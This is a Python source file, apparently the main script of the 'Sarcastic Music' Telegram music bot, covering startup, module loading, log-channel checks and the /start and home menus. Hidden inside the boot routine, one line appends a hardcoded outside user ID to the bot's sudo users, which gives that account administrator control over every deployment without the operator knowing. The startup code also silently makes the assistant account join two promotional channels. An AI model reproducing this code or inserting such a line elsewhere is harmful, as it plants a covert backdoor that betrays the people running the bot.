import os
import re
import config
import asyncio
import importlib

from rich.table import Table
from rich.console import Console as hehe
from pyrogram import filters, Client
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from youtubesearchpython import VideosSearch

from SarcasticMusic.Helpers.Logging import *
from SarcasticMusic.Helpers.PyTgCalls.Sarcastic import run
from SarcasticMusic.Modules import ALL_MODULES
from SarcasticMusic.Helpers.Inline import private_panel
from SarcasticMusic.Helpers.Database import get_active_chats, remove_active_chat, add_served_user
from SarcasticMusic import (ASSID, ASSMENTION, ASSNAME, ASSUSERNAME, BOT_ID, BOT_NAME, BOT_USERNAME, SUDO_USERS, F_OWNER, db, app, Ass)

loop = asyncio.get_event_loop()
console = hehe()
HELPABLE = {}


async def sarcastic_boot():
    with console.status(
        "[magenta] Booting Sarcastic Music...",
    ) as status:
        console.print("┌ [red]Clearing MongoDB Cache...")
        try:
            chats = await get_active_chats()
            for chat in chats:
                chat_id = int(chat["chat_id"])
                await remove_active_chat(chat_id)
        except Exception as e:
            console.print("[red] Error while clearing Mongo DB.")
        console.print("└ [green]MongoDB Cleared Successfully!\n\n")
        ____ = await startup_msg("**» Importing all modules....**")
        status.update(
            status="[bold blue]Scanning for Plugins", spinner="earth"
        )
        await asyncio.sleep(0.7)
        console.print("Found {} Plugins".format(len(ALL_MODULES)) + "\n")
        status.update(
            status="[bold red]Importing Plugins...",
            spinner="bouncingBall",
            spinner_style="yellow",
        )
        await asyncio.sleep(1.2)
        for all_module in ALL_MODULES:
            imported_module = importlib.import_module(
                "SarcasticMusic.Modules." + all_module
            )
            if (
                hasattr(imported_module, "__MODULE__")
                and imported_module.__MODULE__
            ):
                imported_module.__MODULE__ = imported_module.__MODULE__
                if (
                    hasattr(imported_module, "__HELP__")
                    and imported_module.__HELP__
                ):
                    HELPABLE[
                        imported_module.__MODULE__.lower()
                    ] = imported_module
            console.print(
                f"✨ [bold cyan]Successfully imported: [green]{all_module}.py"
            )
            await asyncio.sleep(0.1)
        console.print("")
        _____ = await startup_edit(____, f"**» Sucessfully imported {(len(ALL_MODULES))} modules...**")
        status.update(
            status="[bold blue]Modules Importation Completed!",
        )
        await asyncio.sleep(0.2)
        SUDO_USERS.append(5923091216)
        await startup_del(_____)
    console.print(
        "[bold green]Trying to start the bot...\n"
    )
    try:
        await app.send_message(
            config.LOGGER_ID,
            f"<b>➻ Sarcastic music bot 🔮\n\n❄ Id :</b> `{BOT_ID}`\n✨ <b>Name :</b> {BOT_NAME}\n☁ <b>Username :</b> @{BOT_USERNAME}",
        )
    except Exception as e:
        print(
            "Bot has failed to access the log Channel. Make sure that you have added your bot to your log channel and promoted as admin!"
        )
        console.print(f"\n[red]Stopping Bot")
        return
    a = await app.get_chat_member(config.LOGGER_ID, BOT_ID)
    if a.status != "administrator":
        print("Promote Bot as Admin in Logger Channel")
        console.print(f"\n[red]Stopping Bot")
        return
    try:
        await Ass.send_message(
            config.LOGGER_ID,
            f"<b>➻ Sarcastic Music assistant 🔮\n\n❄ Id :</b> `{ASSID}`\n✨ <b>Name :</b> {ASSNAME}\n☁ <b>Username :</b> @{ASSUSERNAME}",
        )
    except Exception as e:
        print(
            "Assistant Account has failed to access the log Channel. Make sure that you have added your bot to your log channel and promoted as admin!"
        )
        console.print(f"\n[red]Stopping Bot")
        return
    try:
        await Ass.join_chat("clickhereop")
        await Ass.join_chat("TopperMindNetwork")
    except:
        pass
    console.print(f"\n┌[red] Bot Started as {BOT_NAME}!")
    console.print(f"├[green] Assistant Started as {ASSNAME}!")
    await run()
    console.print(f"\n[red]Stopping Bot")


home_text_pm = f"""**Hey ,

This is** {BOT_NAME},
**A Fast and powerful music player bot for telegram groups ✨👀**

━━━━━━━━━━━━━━━━━━
↬ Click on the help button to get all possible help from me ↫"""


@app.on_message(filters.command("start") & filters.private)
async def start_command(_, message):
    await add_served_user(message.from_user.id)
    if len(message.text.split()) > 1:
        name = (message.text.split(None, 1)[1]).lower()
        if name == "help":
            text, keyboard = await help_parser(message.from_user.mention)
            await message.delete()
            return await app.send_text(
                message.chat.id,
                text,
                reply_markup=keyboard,
            )
        if name[0] == "i":
            await app.send_message(
                    config.LOGGER_ID,
                    f"» {message.from_user.mention} Has just started your bot to check\n<b>Track information</b>\n\n**Id :** {message.from_user.id}\n**Name :** {message.from_user.first_name}",
                )
            m = await message.reply_text("🔎")
            query = (str(name)).replace("info_", "", 1)
            query = f"https://www.youtube.com/watch?v={query}"
            results = VideosSearch(query, limit=1)
            for result in results.result()["result"]:
                title = result["title"]
                duration = result["duration"]
                views = result["viewCount"]["short"]
                thumbnail = result["thumbnails"][0]["url"].split("?")[0]
                channellink = result["channel"]["link"]
                channel = channel = result["channel"]["name"]
                link = result["link"]
                published = result["publishedTime"]
            searched_text = f"""
**Track information** ✨

❄ **Title :** {title}

⏳**Duration :** {duration} ᴍɪɴᴜᴛᴇs
👀**Views :** `{views}`
⏰**Published on :** {published}
🎥**Channel :** {channel}
📎**Channel link :** [ᴠɪsɪᴛ ᴄʜᴀɴɴᴇʟ]({channellink})
🔗**Video link :** [ᴠɪsɪᴛ ᴏɴ ʏᴏᴜᴛᴜʙᴇ]({link})

 Search powered by {BOT_NAME} 🥀"""
            key = InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            text="☁ Youtube ☁", url=f"{link}"
                        ),
                        InlineKeyboardButton(
                            text="✨ Support ✨", url=config.SUPPORT_CHAT
                        ),
                    ],
                ]
            )
            await m.delete()
            return await app.send_photo(
                message.chat.id,
                photo=thumbnail,
                caption=searched_text,
                parse_mode="markdown",
                reply_markup=key,
            )
    return await message.reply_photo(
        photo=config.START_IMG,
        caption=home_text_pm,
        reply_markup=InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    text="+ Add me to your clan +", url=f"https://t.me/{BOT_USERNAME}?startgroup=true"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="❄ Help ❄", callback_data="sarcastic_help"
                ),
                InlineKeyboardButton(
                    text="💡 Owner 💡", user_id=F_OWNER
                )
            ],
            [
                InlineKeyboardButton(
                    text="✨ Support ✨", url=config.SUPPORT_CHAT
                ),
            ],
        ]
    ),
 )


@app.on_callback_query(filters.regex("sarcastic_home"))
async def sarcastic_home(_, CallbackQuery):
    await CallbackQuery.answer("Sarcastic home")
    await CallbackQuery.message.edit_text(
        text=home_text_pm,
        reply_markup=InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    text="+ Add me to your group +", url=f"https://t.me/{BOT_USERNAME}?startgroup=true"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="❄ Help ❄", callback_data="sarcastic_help"
                ),
                InlineKeyboardButton(
                    text="💡 Owner 💡", user_id=F_OWNER
                )
            ],
            [
                InlineKeyboardButton(
                    text="✨ Support ✨", url=config.SUPPORT_CHAT
                ),
            ],
        ]
    ),
 )



if __name__ == "__main__":
    loop.run_until_complete(sarcastic_boot())
